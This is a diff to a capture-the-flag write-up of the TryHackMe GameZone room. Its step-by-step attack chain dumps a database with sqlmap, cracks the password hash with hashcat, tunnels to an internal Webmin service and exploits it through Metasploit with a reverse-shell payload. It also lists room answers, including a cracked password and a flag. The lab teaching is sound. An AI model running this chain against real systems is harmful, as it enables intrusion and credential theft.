@@ -10,7 +10,7 @@
 	- **Answer** : portail.php
 - Using SQLMap
 	- Intercept the request from portail.php by using BurpSuite
-     - picture: [GameZone_3.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_3.png),[GameZone_4.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_4.png)
+         - picture: [GameZone_3.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_3.png),[GameZone_4.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_4.png)
 	- Save the request in text file
 	- We can then pass this into SQLMap to use our authenticated user session.
 		SQLMap option:
@@ -18,7 +18,7 @@
 			--dbms tells SQLMap what type of database management system it is
 			--dump attempts to outputs the entire database
 		sqlmap -r request --dbms=mysql --dump
-
+        - picture: [GameZone_5.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_5.png)
 	- In the users table, what is the hashed password?
 	    - **Answer**: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
 	- What was the username associated with the hashed password?
@@ -36,6 +36,7 @@
 - Cracking with hashcat
 
 	sudo hashcat -m 1400 [path to hash file] [path to wordlist] --force
+    - picture: [GameZone_6.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_6.png),[GameZone_7.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_7.png),[GameZone_8.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_8.png)
 	- What is the de-hashed password?
 		- **Answer**: videogamer124
 	- What is the user flag?
@@ -43,6 +44,7 @@
 
 - Exposing services with reverse SSH tunnels
 	- How many TCP sockets are running? 
+    - picture: [GameZone_9.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
 	- execute the command : ss -tulpn
 	    - **Answer**: 5
 
@@ -54,9 +56,11 @@ From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>
 Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.
 
 - What is the name of the exposed CMS?
+ - picture: [GameZone_12.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_12.png)
 	- **Answer**: webmin
 
 - What is the CMS version?	
+ - picture: [GameZone_13.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_13.png)
 	- **Answer**:1.580
 
 
@@ -64,10 +68,13 @@ Once complete, in your browser type "localhost:10000" and you can access the new
 	- start metasploit
 	- search exploit undr the metasploit db
 		- search webmin
+         - picture: [GameZone_14.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_14.png)
 		- Select the Remote command execution -->  0  exploit/unix/webapp/webmin_show_cgi_exec
 		- use [exploit number]
 		- check settings : show info
-			- We need to set PASSWORD / USERNAME / RHOST / RPORT	
+         - picture: [GameZone_15.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_15.png)
+			- We need to set PASSWORD / USERNAME / RHOST / RPORT
+             - picture: [GameZone_16.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_16.png)	
 				- set PASSWORD videogamer124
 				- set USERNAME agent47
 				- set RPORT 10000
@@ -75,10 +82,15 @@ Once complete, in your browser type "localhost:10000" and you can access the new
 				- set ssl false (we are connecting to  port than 80) 	
 			- show payloads
 				- set payload cmd/unix/reverse
+                 - picture: [GameZone_18.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
 				- set lhost [local machine IP]
+                 - picture: [GameZone_19.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
 			- Execute the payload
 				- run
+                 - picture: [GameZone_20.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_20.png)
 			- access to the session in background
 				- sessions 1
+                 - picture: [GameZone_21.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_21.png)
 			- find the flag
+                - picture: [GameZone_22.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_22.png)
 				 - **Answer**:a4b945830144bdd71908d12d902adeee
